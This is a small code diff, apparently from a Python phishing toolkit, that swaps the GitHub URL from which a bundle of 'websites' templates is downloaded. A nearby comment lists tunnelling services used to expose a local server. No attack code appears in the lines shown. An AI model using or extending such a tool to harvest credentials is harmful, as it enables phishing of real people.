@@ -191,7 +191,7 @@ from bs4 import BeautifulSoup
 # Get Columns of Screen
 columns = get_terminal_size().columns
 
-websites_url = "https://github.com/touchmycrazyredhat/files/raw/main/websites.zip"
+websites_url = "https://github.com/KasRoudra2/maxfiles/archive/main.zip"
 repo_branch = "maxfiles-main"
 
 # CF = Cloudflared, NR = Ngrok, LX = LocalXpose, LHR = LocalHostRun
